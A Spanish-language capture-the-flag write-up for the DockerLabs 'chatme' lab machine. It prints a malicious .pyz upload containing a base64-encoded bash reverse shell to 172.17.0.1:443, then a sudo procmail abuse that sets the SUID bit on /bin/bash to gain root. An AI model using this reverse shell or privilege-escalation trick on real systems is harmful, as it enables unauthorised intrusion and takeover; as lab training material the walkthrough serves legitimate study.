nmap:80

![image](https://github.com/user-attachments/assets/6da55b66-44e5-45aa-b6bd-204f3656c0a3)


---
al ingresar a la pagina principal vemos esto
![[dockerlabs/medio/chatme/pagina principal.png]]
entramos a "chat Right now" y es un .dl así que lo añadimos a "/etc/host" 

al entrar nos mandara a un tipo chat que hay
![[chat.png]]

con burpsuite capturamos y vemos que los archivos se suben en formato "PYZ"
en el terminal creo un virus.pyz:

    import os
    os.system("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYx' | base64 -d | bash")

en la pagina https://www.revshells.com/ creamos una reverse en base64 y nos dara algo así: YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYx que será lo que colocaremos en el código 

lo guardamos, colocamos el terminal en escucha y subimos el archivo
esperamos un rato y estamos dentro ahora escalamos
después de esperar un rato tenemos al conexión
![[dockerlabs/medio/chatme/conexion1.png]]
al hacer un sudo -l aparece: /usr/bin/procmail
![[sudo-l.png]]

en la carpeta /tmp hay un archivo llamado "crontab.z4q2tt" que podemos modificar 
como no hay una carpeta de procmail creamos una llamada "procmailrc",  dentro colocamos el código: 

     TMPFILE="/tmp/pwned"
     :0
	 | touch $TMPFILE

![[dockerlabs/medio/chatme/codigo1.png]]

ahora probamos que el código funciona utilizando este comando

	 echo "test" | sudo /usr/bin/procmail -m .procmailrc

![[dockerlabs/medio/chatme/codigo2.png]]

ahora colocamos el mismo comando pero lo modificamos 

     TMPFILE="/tmp/pwned"
     :0
	 | touch $TMPFILE; chmod u+s /bin/bash

![[bash.png]]

volvemos a lanzar el comando:

     echo "test" | sudo /usr/bin/procmail -m .procmailrc

revisamos con "ls -la" el archivo en especifico de /bin/bash  y vemos que esta en rojo como queríamos con los permisos, ahora lanzamos un "bash -p"
![[dockerlabs/medio/chatme/root.png]]
y somos root!
